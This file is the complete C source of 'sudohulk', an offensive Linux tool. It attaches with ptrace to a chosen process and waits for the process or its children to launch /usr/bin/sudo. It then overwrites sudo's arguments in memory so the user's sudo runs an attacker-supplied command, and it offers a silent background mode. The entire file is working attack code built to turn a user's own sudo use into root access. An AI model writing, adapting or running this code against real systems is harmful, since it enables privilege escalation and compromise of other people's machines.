#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <assert.h>

#include <asm/unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "sh_remotedata.h"
#include "sh_common.h"
#include "sh_string.h"

#define ptrace_opts 	PTRACE_O_TRACEFORK  | \
			PTRACE_O_TRACECLONE | \
			PTRACE_O_TRACESYSGOOD


#define get_signal(status) ({ \
	int ret = 0; \
	if(WIFSTOPPED(status)){ \
		ret = WSTOPSIG(status); \
	} \
	ret; \
})

typedef struct {
	int quit;
	int bg;
	int keep;
	pid_t pid;
	char **cmd;
} sudohulk_options_t;



int ptrace_attach(pid_t pid){
	int status;
	assert( ptrace(PTRACE_ATTACH, pid, NULL, NULL) != -1 );
	assert( waitpid(pid, &status, 0) != -1 );
	return status;
}

void help(void){
	printf("sudohulk [-qdk] PID COMMAND [ARGS]\n\n");
	printf("Options:\n");
	printf("   -q quit when change a command\n");
	printf("   -d run in background\n");
	printf("   -k keep original command line (appending to new)\n");
	exit(0);
}


int cmd_change(pid_t pid, sudohulk_options_t *opts, struct user_regs_struct *regs){
	char **new_cmd, **argv, *first_argv;
	unsigned long new_addr, first_argv_addr = 0;

	int i, j, ret = 0, malloc_size;

	argv = get_remote_string_array(pid, regs->rsi+__wordsize);

	if(!argv){
		printf("[-] sudo called without arguments, skipping ...\n");
		goto end;
	}

	printf("[*] overwriting parameters\n");

	int old_argc = args_count(argv);
	int new_argc = args_count(opts->cmd);

	first_argv_addr = ptrace(PTRACE_PEEKDATA, pid, regs->rsi, 0L);
	if(!first_argv_addr || first_argv_addr == ~0UL){
		goto free_argv_end;
	}

	if( (first_argv = get_remote_string(pid, first_argv_addr)) == NULL ){
		goto free_argv_end;
	}

	malloc_size = 2+new_argc;

	if(opts->keep)
		malloc_size += old_argc;

	new_cmd = malloc( malloc_size * sizeof(char *) );

	new_cmd[0] = first_argv;
	for(i=1; i<=new_argc; i++)
		new_cmd[i] = opts->cmd[i-1];

	if(opts->keep){
		for(j=0; j<old_argc; j++)
			new_cmd[i++] = argv[j];
	}

	new_cmd[i] = NULL;

	/* align address */
	new_addr = (regs->rsi & ~0xfffL);
	write_remote_double_char(pid, new_addr, new_cmd);

	/* change the address of rsi */
	regs->rsi = new_addr;
	ptrace(PTRACE_SETREGS, pid, NULL, regs);

	ret = 1;

	free(first_argv);
	free(new_cmd);

	free_argv_end:

	for(i=0; argv[i]; i++)
		free(argv[i]);

	free(argv);

	end:

	return ret;

}

int ptrace_loop(sudohulk_options_t *opts){
	int status, event, ret = 0;
	long sig = 0;
	pid_t pid = opts->pid;
	int skip = 0;

	printf("starting attach pid: %d\n\n", pid);
	status = ptrace_attach(pid);

	ptrace(PTRACE_SETOPTIONS, pid, 0, ptrace_opts);

	struct user_regs_struct regs;

	int return_pid = pid;
	long long_var;
	enum __ptrace_request op = PTRACE_CONT;

	while(1){
		sig = 0;
		event = status >> 16;
		switch(event){
			case PTRACE_EVENT_FORK:
			case PTRACE_EVENT_CLONE:
				ptrace(PTRACE_GETEVENTMSG, return_pid, 0, &long_var);
				printf("[*] new process created: %ld\n", long_var);
			break;

			case 0:
				sig = get_signal(status);
				if(sig == (SIGTRAP | 0x80) || sig == SIGSTOP || sig == SIGTRAP)
					sig = 0;

				if(skip){
					op = PTRACE_DETACH;
					break;
				}

				if(return_pid == pid){
					op = PTRACE_CONT;
					break;
				}

				/* don't care about signals */
				if((sig != SIGCHLD && sig)){
					op = PTRACE_DETACH;
					break;
				}

				ptrace(PTRACE_GETREGS, return_pid, NULL, &regs);
				if(regs.orig_rax == __NR_execve && regs.rdi){
					char *filename = get_remote_string(return_pid, regs.rdi);
					if(!filename)
						break;

					printf("[+] (%d) sys_execve detected >>> '%s'\n", return_pid, filename);

					if(!strcmp(filename, "/usr/bin/sudo")){
						printf("[+] sudo detect\n");
						if(cmd_change(return_pid, opts, &regs)){
							skip = opts->quit;
							ret++;
						}
					}

					free(filename);
					op = PTRACE_DETACH;
				} else {
					op = PTRACE_SYSCALL;
				}

			break;
		}

		ptrace(op, return_pid, 0, sig);
		return_pid = waitpid(-1, &status, __WALL);
		if(return_pid < 0)
			break;
	}

	printf("[-] exiting ...\n");
	return ret;
}


void parser_args(int argc, char ***argv, sudohulk_options_t *opts){
	int opt;

	while((opt = getopt(argc, *argv, "+qdk")) != EOF){
		switch(opt){
			case 'q':
				opts->quit = 1;
				break;
			case 'd':
				opts->bg = 1;
				break;
			case 'k':
				opts->keep = 1;
				break;

			default:
				exit(1);
		}
	}

	if((optind+2) > argc){
		printf("you must set PID number and COMMAND line\n");
		exit(0);
	}

	opts->pid = atoi((*argv)[optind]);
	opts->cmd = (*argv+optind+1);
}

int main(int argc, char **argv){
	if(argc == 1)
		help();

	sudohulk_options_t opts = {.quit = 0, .bg = 0, .pid = 0, .cmd = NULL, .keep = 0 };
	parser_args(argc, &argv, &opts);

	if(opts.bg){
		pid_t pid = fork();
		if(pid == -1){
			perror("fork");
			exit(-1);
		} else if(pid){
			printf("running in background, pid:%d\n", pid);
			exit(0);
		} else if(pid == 0){
			int devnull = open("/dev/null", O_RDWR);
			dup2(devnull, STDOUT_FILENO);
		}
	}

	return ptrace_loop(&opts);
}
